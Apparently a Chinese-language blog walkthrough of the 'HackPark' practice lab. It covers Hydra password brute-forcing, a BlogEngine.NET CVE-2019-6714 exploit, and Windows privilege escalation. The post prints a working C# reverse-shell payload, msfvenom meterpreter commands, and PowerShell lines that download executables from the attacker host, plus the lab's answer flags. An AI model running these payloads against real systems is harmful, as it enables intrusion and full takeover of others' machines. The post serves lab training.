@@ -1,0 +1,426 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>Offensive Pentesting-HackPark | w3nx1z1</title><meta name="author" content="w3nx1z1"><meta name="copyright" content="w3nx1z1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Offensive Pentesting-HackParkBruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine 使用 Hydra 暴力登录网站，识别并使用公共漏洞，然后升级您在此 Windows 计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Offensive Pentesting-HackPark">
+<meta property="og:url" content="http://w3nx1z1.github.io/posts/e55fac08.html">
+<meta property="og:site_name" content="w3nx1z1">
+<meta property="og:description" content="Offensive Pentesting-HackParkBruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine 使用 Hydra 暴力登录网站，识别并使用公共漏洞，然后升级您在此 Windows 计">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://w3nx1z1.github.io/img/mikey.png">
+<meta property="article:published_time" content="2025-03-10T07:01:35.189Z">
+<meta property="article:modified_time" content="2025-03-10T06:40:47.895Z">
+<meta property="article:author" content="w3nx1z1">
+<meta property="article:tag" content="打靶">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://w3nx1z1.github.io/img/mikey.png"><link rel="shortcut icon" href="/img/%E8%87%AA%E7%94%B1%E4%B9%8B%E7%BF%BC.jpg"><link rel="canonical" href="http://w3nx1z1.github.io/posts/e55fac08.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="TndEWE7xyUxTUkbHXgpxFtutY3_VE4qYCNq6-qHt11I"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Offensive Pentesting-HackPark',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-03-10 14:40:47'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="\themes\butterfly\source\css\custom.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="w3nx1z1" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/mikey.png" onerror="onerror=null;src='/img/404.jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">70</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/baobao.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="w3nx1z1"><span class="site-name">w3nx1z1</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Offensive Pentesting-HackPark</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-10T07:01:35.189Z" title="发表于 2025-03-10 15:01:35">2025-03-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-10T06:40:47.895Z" title="更新于 2025-03-10 14:40:47">2025-03-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>10分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Offensive Pentesting-HackPark"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Offensive-Pentesting-HackPark"><a href="#Offensive-Pentesting-HackPark" class="headerlink" title="Offensive Pentesting-HackPark"></a>Offensive Pentesting-HackPark</h1><pre><code>Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine
+使用 Hydra 暴力登录网站，识别并使用公共漏洞，然后升级您在此 Windows 计算机上的权限！
+</code></pre>
+<h2 id="Deploy-the-vulnerable-Windows-machine"><a href="#Deploy-the-vulnerable-Windows-machine" class="headerlink" title="Deploy the vulnerable Windows machine"></a>Deploy the vulnerable Windows machine</h2><pre><code>Connect to our network and deploy this machine. Please be patient as this machine can take up to 5 minutes to boot! You can test if you are connected to our network, by going to our access page. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.
+</code></pre>
+<p>这部分告诉我们 这台机器配置了阻止ICMP(ping)探测 我们在尝试使用nmap进行扫描的时候也能发现</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412060930954.png" alt="image-20241206093037786"></p>
+<p>建议我们使用-Pn参数 -Pn参数就是跳过存活主机的探测 直接去探测端口</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412060931609.png" alt="image-20241206093122493"></p>
+<p>我们先来访问一下web服务</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412060935818.png" alt="image-20241206093500645"></p>
+<p>第一题问主页上的小丑叫什么名字 将图片保存下来 识图发现是小丑回魂中的小丑 搜了一下找到名字叫<code>Pennywise</code></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412060936961.png" alt="image-20241206093602869"></p>
+<h2 id="Using-Hydra-to-brute-force-a-login"><a href="#Using-Hydra-to-brute-force-a-login" class="headerlink" title="Using Hydra to brute-force a login"></a>Using Hydra to brute-force a login</h2><p>我们需要找到要攻击的登录页面，并确定表单向 Web 服务器发出的请求类型。通常，Web 服务器发出两种类型的请求，一种是用于从 Web 服务器请求数据的 <strong>GET</strong> 请求，另一种是用于将数据发送到服务器的 <strong>POST</strong> 请求。</p>
+<p>Windows 网站登录表单使用什么请求类型？</p>
+<pre><code>POST
+</code></pre>
+<p>我们先找登陆表单 点击右侧的三个横线 发现有LOG IN选项</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412060937004.png" alt="image-20241206093746630"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412060937827.png" alt="image-20241206093737731"></p>
+<p>随便写个账号密码 抓个包看 发现是POST请求方式</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412060939906.png" alt="image-20241206093946833"></p>
+<p>下面使用hydra来爆破登陆密码</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412061009504.png" alt="image-20241206100932335"></p>
+<p>先放完整的命令写法</p>
+<pre><code>hydra -l admin -P brutehash/rockyou.txt 10.10.105.93 http-post-form &quot;/Account/login.aspx:__VIEWSTATE=WiQyMbrpvQFvihuDvWvn6Am9t4YDNTQ4FOgKB2a73Be5YNA9RMlwlwG13M8wPEK8mJ5UM%2FLLQzFvKwVDofXSYs4Ycm6VDJwU8scxn8rzf5NYuvICeKT7Xf1naveUEieK33ENL4NVMhT04QiIGXy88arVpxAKjXDVuzDY0hav8ycT3gkc&amp;__EVENTVALIDATION=%2F7fpX2AtdXmM4yvnGc7%2BcqQaZfmcenPVTgp74zesjXhfFrBfm5OB3orCRUw4KfPrbSD6eJItzn3l9r0QTvbi%2BP3b1p5f%2FOTGQ0hiyuvGfuI07T2IvLg7rFvlgt0AsgXYo8vSnxcu06GDShB1rWrYA60amzCMCKOkHDn1GDa26eas5WKC&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed&quot; -F
+
+三个部分之间都用:隔开
+第一部分：登陆页面的地址
+/Account/login.aspx 
+第二部分：
+抓包拿到的post请求部分内容 要将username部分的内容改成^USER^ password部分的内容改成^PASS^
+第三部分：
+登陆失败时返回的内容
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412061033692.png" alt="image-20241206103330122"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412061033725.png" alt="image-20241206103339730"></p>
+<p>爆破出密码 是<code>1qaz2wsx</code></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412061035894.png" alt="image-20241206103554747"></p>
+<p>此工具不仅适用于暴力破解 HTTP 表单，还适用于其他协议，如 FTP、SSH、SMTP、SMB 等。</p>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>hydra -P <wordlist> -v <ip> <protocol></td>
+<td>对您选择的协议进行暴力破解</td>
+</tr>
+<tr>
+<td>hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol></td>
+<td>您可以使用 Hydra 暴力破解用户名和密码。它将遍历您列表中的每个组合。（-vV &#x3D; 详细模式，显示登录尝试</td>
+</tr>
+<tr>
+<td>hydra -t 1 -V -f -l <username> -P <wordlist> rdp:&#x2F;&#x2F;<ip></td>
+<td>使用密码列表攻击 Windows 远程桌面</td>
+</tr>
+<tr>
+<td>hydra -l <username> -P .<password list> $ip -V http-form-post ‘&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log In&amp;testcookie&#x3D;1:S&#x3D;Location’</td>
+<td>为 Hydra 制定一个更具体的请求以使用蛮力。</td>
+</tr>
+</tbody></table>
+<h2 id="Compromise-the-machine"><a href="#Compromise-the-machine" class="headerlink" title="Compromise the machine"></a>Compromise the machine</h2><p>Now you have logged into the website, are you able to identify the version of the BlogEngine?</p>
+<pre><code>3.3.6.0
+</code></pre>
+<p>我们在登录到后台之后 可以在<code>About</code>中看到使用的框架版本</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412061059795.png" alt="image-20241206105904576"></p>
+<p>搜一下 <code>BlogEngine 3.3.6</code>的漏洞 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412061059387.png" alt="image-20241206105942260"></p>
+<p>就选第一个 复制出来 查看内容 看到漏洞编号</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412061100125.png" alt="image-20241206110034004"></p>
+<p>What is the CVE?</p>
+<pre><code>CVE-2019-6714
+</code></pre>
+<p>下面就是利用漏洞来获得机器的shell 给的漏洞利用文件原理：</p>
+<p>这个漏洞（CVE-2019-6714）是由 BlogEngine.NET（版本 3.3.6 及更早版本）中的目录遍历漏洞引起的，导致远程代码执行 该漏洞的关键在于未对 theme 参数进行适当的验证，使攻击者能够通过修改该参数进行目录遍历，从而执行恶意代码。</p>
+<h3 id="上传恶意脚本："><a href="#上传恶意脚本：" class="headerlink" title="上传恶意脚本："></a>上传恶意脚本：</h3><p>首先，需要通过 BlogEngine.NET 的管理界面上传恶意的 PostView.ascx 文件。该文件应当包含反弹 shell（即你提供的 C# 代码）。上传文件通常是在文章编辑页面进行，通过点击工具栏中的文件图标上传文件。该文件会被保存在 &#x2F;App_Data&#x2F;files 目录下。<br>上传的恶意文件示例为：</p>
+<pre><code class="C#">&lt;%@ Control Language=&quot;C#&quot; AutoEventWireup=&quot;true&quot; EnableViewState=&quot;false&quot; Inherits=&quot;BlogEngine.Core.Web.Controls.PostViewBase&quot; %&gt;
+&lt;%@ Import Namespace=&quot;BlogEngine.Core&quot; %&gt;
+
+&lt;script runat=&quot;server&quot;&gt;
+    static System.IO.StreamWriter streamWriter;
+
+    protected override void OnLoad(EventArgs e) &#123;
+        base.OnLoad(e);
+    
+        using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(&quot;10.14.92.176&quot;, 4445)) &#123;
+            using(System.IO.Stream stream = client.GetStream()) &#123;
+                using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) &#123;
+                    streamWriter = new System.IO.StreamWriter(stream);
+
+                    StringBuilder strInput = new StringBuilder();
+
+                    System.Diagnostics.Process p = new System.Diagnostics.Process();
+                    p.StartInfo.FileName = &quot;cmd.exe&quot;;
+                    p.StartInfo.CreateNoWindow = true;
+                    p.StartInfo.UseShellExecute = false;
+                    p.StartInfo.RedirectStandardOutput = true;
+                    p.StartInfo.RedirectStandardInput = true;
+                    p.StartInfo.RedirectStandardError = true;
+                    p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);
+                    p.Start();
+                    p.BeginOutputReadLine();
+
+                    while(true) &#123;
+                        strInput.Append(rdr.ReadLine());
+                        p.StandardInput.WriteLine(strInput);
+                        strInput.Remove(0, strInput.Length);
+                    &#125;
+                &#125;
+            &#125;
+        &#125;
+    &#125;
+
+    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) &#123;
+        StringBuilder strOutput = new StringBuilder();
+
+        if (!String.IsNullOrEmpty(outLine.Data)) &#123;
+            try &#123;
+                strOutput.Append(outLine.Data);
+                streamWriter.WriteLine(strOutput);
+                streamWriter.Flush();
+            &#125; catch (Exception err) &#123; &#125;
+        &#125;
+    &#125;
+&lt;/script&gt;
+&lt;asp:PlaceHolder ID=&quot;phContent&quot; runat=&quot;server&quot; EnableViewState=&quot;false&quot;&gt;&lt;/asp:PlaceHolder&gt;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412061109218.png" alt="image-20241206110921115"></p>
+<h3 id="触发恶意文件"><a href="#触发恶意文件" class="headerlink" title="触发恶意文件"></a>触发恶意文件</h3><p>上传并保存恶意文件后，访问网站，构造一个恶意的 URL 来触发漏洞：</p>
+<pre><code>http://10.10.252.193/?theme=../../App_Data/files
+</code></pre>
+<p>theme 参数被用来加载指定路径的文件。由于缺乏路径验证，可以通过使用 ..&#x2F;..&#x2F; 来进行目录遍历，访问上传的恶意文件，并导致执行反向 shell。</p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><pre><code>nc -nlvp 4445
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202503091621274.png" alt="image-20250309162132021"></p>
+<p>访问后 得到反弹的shell 执行whoami 得到web服务器运行的身份</p>
+<pre><code>iis apppool\blog
+</code></pre>
+<h2 id="Windows-Privilege-Escalation-windows权限提升"><a href="#Windows-Privilege-Escalation-windows权限提升" class="headerlink" title="Windows Privilege Escalation(windows权限提升)"></a>Windows Privilege Escalation(windows权限提升)</h2><h3 id="切换meterpreter-shell"><a href="#切换meterpreter-shell" class="headerlink" title="切换meterpreter shell"></a>切换meterpreter shell</h3><p>nc生成的会话不是很稳定 这里还是选择切换到 meterpreter shell</p>
+<p>使用 msfvenom 通过以下有效负载创建 Windows meterpreter 反向 shell：</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.114.143 LPORT=1234 -f exe -o reverse.exe
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202503091642760.png" alt="image-20250309164205686"></p>
+<p>然后我们开启apache服务 将生成的反弹shell负载放到网站根目录</p>
+<pre><code>systemctl start apache2.service
+cp reverse.exe /var/www/html/reverse.exe
+</code></pre>
+<p>在上面使用nc开启的shell中将这个reverse.exe下载下来</p>
+<pre><code>cd C:\Windows\Temp
+powershell &quot;(New-Object System.Net.WebClient).Downloadfile(&#39;http://10.11.114.143/reverse.exe&#39;,&#39;reverse.exe&#39;)&quot;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202503091652631.png" alt="image-20250309165221550"></p>
+<p>再来配置msfconsole</p>
+<pre><code>use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.11.114.143 
+set LPORT 1234 # 和前面生成reverse.exe一个端口
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202503092024788.png" alt="image-20250309202404693"></p>
+<p>然后输入<code>run</code> 同时在前面nc开启的shell中输入<code>reverse.exe</code>运行反弹shell负载</p>
+<p>成功开启了meterpreter shell 输入sysinfo查看了靶机的操作系统信息</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202503092029761.png" alt="image-20250309202902701"></p>
+<p>What is the OS version of this windows machine?</p>
+<pre><code>Windows 2012 R2 (6.3 Build 9600)
+</code></pre>
+<h3 id="WinPeas提升权限"><a href="#WinPeas提升权限" class="headerlink" title="WinPeas提升权限"></a>WinPeas提升权限</h3><p>这里使用WinPeas进行提权 可以从github上下载<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/peass-ng/PEASS-ng/releases/tag/20250301-c97fb02a">Release Release refs&#x2F;heads&#x2F;master 20250301-c97fb02a · peass-ng&#x2F;PEASS-ng</a></p>
+<pre><code>PEASS-ng是一款全平台提权工具,适用于Windows/linux/unix*/macOS提权.
+这些工具搜索可能的本地权限提升路径，您可以利用这些路径并将它们以漂亮的颜色打印给您，以便您可以轻松识别错误配置。
+</code></pre>
+<p>还从nc的shell传上去也可以 从meterpreter的shell上传过去也行</p>
+<pre><code># 从nc-shell上传
+powershell &quot;(New-Object System.Net.WebClient).Downloadfile(&#39;http://10.11.114.143/winpeas.exe&#39;,&#39;winpeas.exe&#39;)&quot;
+
+# 从meterpreter shell上传
+upload /home/w3nx1z1/桌面/提权/winpeas/winPEASX64.exe
+shell
+</code></pre>
+<p>然后直接运行</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202503092102400.png" alt="image-20250309210247180"></p>
+<p>题目是</p>
+<pre><code>Can you spot a service running some automated task that could be easily exploited? What is the name of this service?
+</code></pre>
+<p>要找一个运行某些自动任务的服务 那就搜索service</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202503092104919.png" alt="image-20250309210435856"></p>
+<p>发现<code>WindowsScheduler</code>是自动运行 且权限是所有用户可以写可以创建 下面也提示了可能存在dll劫持的文件夹</p>
+<p><code>Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])</code></p>
+<p>进去看一下 看到<code>Events</code>文件夹 再进去找到一个<code>20198415519.INI_LOG.txt</code> 日志文件</p>
+<p>发现自动运行的二进制文件就是<code>Message.exe</code> 差不多是每半分钟运行一次 且权限是Administrator</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202503092109447.png" alt="image-20250309210909373"></p>
+<p><font color='red'>那就有一个思路了 我们在创建一个反弹shell负载 改名成<code>Message.exe</code> 并替换原有的Message.exe 等待自动运行的时候就会自动反弹到shell 同时因为是使用管理员权限运行的 我们拿到的shell也是管理员权限的</font></p>
+<p>新开一个msfconsole接受管理员权限的shell 端口为2333 下面我们生成reverse shell负载也用这个端口</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202503092133647.png" alt="image-20250309213352584"></p>
+<p>生成reverse shell负载</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.114.143 LPORT=2333 -f exe -o Message.exe
+</code></pre>
+<p>在前面的shell中将原来的Message.exe改名为Message.bak 下载到这个Message.exe反弹shell负载</p>
+<pre><code>rename Message.exe Message.bak
+powershell &quot;(New-Object System.Net.WebClient).Downloadfile(&#39;http://10.11.114.143/Message.exe&#39;,&#39;Message.exe&#39;)&quot;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202503092135004.png" alt="image-20250309213547937"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202503092137371.png" alt="image-20250309213724308"></p>
+<p>回到前面新开的msf中输入run 开始准备接受反弹shell</p>
+<p>等差不多半分钟 成功接收到shell</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202503092148624.png" alt="image-20250309214856559"></p>
+<p>读jeff和Administator用户桌面下的flag</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202503092149064.png" alt="image-20250309214944019"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202503092149932.png" alt="image-20250309214949882"></p>
+<p>回答问题</p>
+<p>Can you spot a <em>service</em> running some automated task that could be easily exploited? What is the <strong>name</strong> of this service?</p>
+<pre><code>WindowsScheduler
+</code></pre>
+<p>What is the name of the binary you’re supposed to exploit?</p>
+<pre><code>Message.exe
+</code></pre>
+<p>What is the user flag (on Jeffs Desktop)?</p>
+<pre><code>759bd8af507517bcfaede78a21a73e39
+</code></pre>
+<p>What is the root flag?</p>
+<pre><code>7e13d97f05f7ceb9881a3eb3d78d3e72
+</code></pre>
+<p>what was the Original Install time? (This is date and time)</p>
+<pre><code>8/3/2019, 10:43:23 AM  # 查询系统原始安装时间用systeminfo
+</code></pre>
+<h2 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h2><p>1.找到登陆页面后 利用hydra抓包爆破出登陆的账号密码</p>
+<p>2.进入后台 找到框架的版本对应的漏洞 上传反弹shell恶意代码 利用目录遍历 执行恶意代码 获取到最初的shell</p>
+<p>3.利用低权限的shell上传msfvenom生成的反弹shell负载 切换到meterpreter shell</p>
+<p>4.利用winpeas找到可能被利用的权限提升的路径 发现是一个以管理员权限运行的定时任务 </p>
+<p>5.再次使用msfvenom生成反弹shell负载 替换掉定时任务运行的Message.exe </p>
+<p>6.等待自动运行时 成功反弹到管理员权限的shell 读取普通用户和管理员用户下的flag</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io">w3nx1z1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io/posts/e55fac08.html">http://w3nx1z1.github.io/posts/e55fac08.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://w3nx1z1.github.io" target="_blank">w3nx1z1</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%89%93%E9%9D%B6/">打靶</a></div><div class="post_share"><div class="social-share" data-image="/img/mikey.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/75d05e45.html" title="对博客进行SEO优化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">对博客进行SEO优化</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a 